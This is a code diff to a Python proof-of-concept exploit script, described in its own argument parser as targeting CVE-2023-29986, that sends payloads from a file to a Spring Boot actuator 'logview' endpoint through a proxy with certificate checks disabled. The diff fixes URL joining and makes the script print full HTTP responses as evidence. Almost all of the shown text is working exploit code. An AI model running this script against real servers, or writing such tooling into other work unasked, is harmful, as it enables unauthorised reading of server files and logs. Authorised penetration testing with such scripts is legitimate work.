@@ -6,7 +6,7 @@ import argparse
 from urllib.parse import urljoin
 
 def exploit_spring_boot_actuator(target_url, proxy_url, payload_file=None):
-    endpoint = "/actuator/logview"
+    endpoint = "actuator/logview"
     
     # Proxy settings
     proxies = {
@@ -23,6 +23,10 @@ def exploit_spring_boot_actuator(target_url, proxy_url, payload_file=None):
         with open(payload_file, 'r') as f:
             payloads = f.readlines()
     
+    # Ensure the base URL ends with a trailing slash
+    if not target_url.endswith('/'):
+        target_url += '/'
+    
     for payload in payloads:
         payload = payload.strip()
         
@@ -33,14 +37,18 @@ def exploit_spring_boot_actuator(target_url, proxy_url, payload_file=None):
             # Send the request
             response = requests.get(full_url, proxies=proxies, verify=False)
             
-            # Check if the exploit is successful
-            if response.status_code == 200:
-                print(f"Exploit successful with payload {payload}! Response:\n{response.text}")
-            else:
-                print(f"Exploit failed with payload {payload}! HTTP Status Code: {response.status_code}")
+            # Display the full HTTP response as evidence
+            print(f"Full HTTP Response for payload {payload}:\n")
+            print(f"HTTP/1.1 {response.status_code} {response.reason}")
+            for header, value in response.headers.items():
+                print(f"{header}: {value}")
+            print("\n")
+            print(response.text)
+            print("="*50)
         
         except Exception as e:
             print(f"An error occurred with payload {payload}: {e}")
+
 
 if __name__ == "__main__":
     parser = argparse.ArgumentParser(description="PoC for CVE-2023-29986")
